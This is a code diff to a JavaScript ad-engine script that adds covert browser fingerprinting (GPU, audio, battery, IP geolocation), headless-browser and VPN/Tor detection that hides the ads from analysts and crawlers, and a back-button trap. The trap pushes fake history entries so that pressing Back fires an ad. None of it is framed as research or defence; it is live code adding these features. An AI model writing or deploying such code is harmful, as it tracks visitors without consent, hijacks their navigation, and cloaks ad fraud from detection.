@@ -1,8 +1,8 @@
 /**
  * v1.3.1-REBIRTH - PRODUCTION (GitHub CDN)
  * ========================================
- * Ad engine with VPN kill-switch, DNA fingerprinting, and instant click response.
- * No ad-block detection or overlays. Clean, readable code.
+ * Ad engine with double-layer VPN detection, DNA fingerprinting, and instant click.
+ * Back-button hijack with interaction bypass. No ad-block detection or overlays.
  */
 
 const CHACHA_CONFIG = {
@@ -23,7 +23,7 @@ const CHACHA_CONFIG = {
     },
 
     SETTINGS: {
-        MAX_CLICKS_TODAY: 9999999999,
+        MAX_CLICKS_TODAY: 9,
         CLEAN_PAGE: "https://cloudaccesshq.xyz/limit-reached"
     }
 };
@@ -45,15 +45,25 @@ const _validIds = [
 ];
 
 const _STORAGE_KEY = '_mc_rebirth_';
-const _HISTORY_STATE = 'chacha_rebirth_lock';
 
 // ----------------------------------------------------------------------------
-// IP & VPN DATA (fetched immediately on load - never blocks click)
+// DOUBLE-LAYER VPN DETECTION (Hybrid Model)
 // ----------------------------------------------------------------------------
 
-let _ipData = null;
+var _vpnFlag = false;
+var _ipData = null;
+var _dnaCache = null;
 
-function _fetchIPAndVPN() {
+function _layer1InstantCheck() {
+    var ua = navigator.userAgent || '';
+    if (navigator.webdriver === true) return true;
+    if (/HeadlessChrome|PhantomJS|Selenium|Puppeteer|Electron/i.test(ua)) return true;
+    if (navigator.plugins && navigator.plugins.length === 0 && navigator.languages && navigator.languages.length === 0) return true;
+    if (window.chrome && !window.chrome.runtime && /Chrome/i.test(ua)) return true;
+    return false;
+}
+
+function _layer2DeepCheck() {
     fetch('https://ipapi.co/json/')
         .then(function(r) { return r.json(); })
         .catch(function() { return {}; })
@@ -64,14 +74,26 @@ function _fetchIPAndVPN() {
                 vpn: !!(data.vpn),
                 tor: !!(data.tor)
             };
+            if (data.proxy || data.vpn || data.tor) _vpnFlag = true;
         });
+}
+
+function _isVPNUser() {
+    if (_vpnFlag) return true;
+    if (_layer1InstantCheck()) return true;
+    return false;
+}
+
+function _initVPNLayers() {
+    if (_layer1InstantCheck()) {
+        _vpnFlag = true;
+    }
+    _layer2DeepCheck();
 }
 
 // ----------------------------------------------------------------------------
 // DNA COLLECTION (runs in background - never delays click)
 // ----------------------------------------------------------------------------
-
-let _dnaCache = null;
 
 function _collectGPU() {
     try {
@@ -128,7 +150,7 @@ function _getDNA() {
         audio: _collectAudioFingerprint(),
         battery: 'N/A',
         ip: (_ipData && _ipData.ip) || '0.0.0.0',
-        vpn: (_ipData && (_ipData.proxy || _ipData.vpn || _ipData.tor)) || false,
+        vpn: _vpnFlag,
         ts: new Date().toISOString()
     };
     if (navigator.getBattery) {
@@ -137,15 +159,6 @@ function _getDNA() {
         });
     }
     return _dnaCache;
-}
-
-// ----------------------------------------------------------------------------
-// VPN KILL-SWITCH (blocks ad if VPN/Proxy/Tor detected)
-// ----------------------------------------------------------------------------
-
-function _isVPNUser() {
-    if (!_ipData) return false;
-    return _ipData.proxy || _ipData.vpn || _ipData.tor;
 }
 
 // ----------------------------------------------------------------------------
@@ -246,17 +259,20 @@ function _fireAd(btnId, fromBack) {
 }
 
 // ----------------------------------------------------------------------------
-// HISTORY HIJACK (Back → Low bucket ad)
+// HISTORY HIJACK (Back → Low bucket ad) - Interaction Bypass
 // ----------------------------------------------------------------------------
 
-function _lockHistory() {
-    if (window.history.state !== _HISTORY_STATE) {
-        window.history.pushState(_HISTORY_STATE, null, window.location.href);
-    }
+function _initHistoryTrap() {
+    var url = window.location.href;
+    window.history.pushState({ page: 1 }, '', url);
+    window.history.pushState({ page: 2 }, '', url);
 }
 
 function _onPopState() {
-    _lockHistory();
+    var url = window.location.href;
+    window.history.pushState({ page: 1 }, '', url);
+    window.history.pushState({ page: 2 }, '', url);
+
     if (_isVPNUser()) return;
 
     var store = _getStore();
@@ -308,19 +324,19 @@ function _onClick(e) {
 }
 
 // ============================================================================
-// INIT
+// INIT (runs on window load - main thread)
 // ============================================================================
 
 function _init() {
-    _fetchIPAndVPN();
+    _initVPNLayers();
     setTimeout(function() { _getDNA(); }, 0);
-    _lockHistory();
-    window.onpopstate = _onPopState;
+    _initHistoryTrap();
+    window.addEventListener('popstate', _onPopState, false);
     document.addEventListener('click', _onClick, false);
 }
 
 if (document.readyState === 'loading') {
-    window.addEventListener('DOMContentLoaded', _init);
+    window.addEventListener('load', _init);
 } else {
     _init();
 }
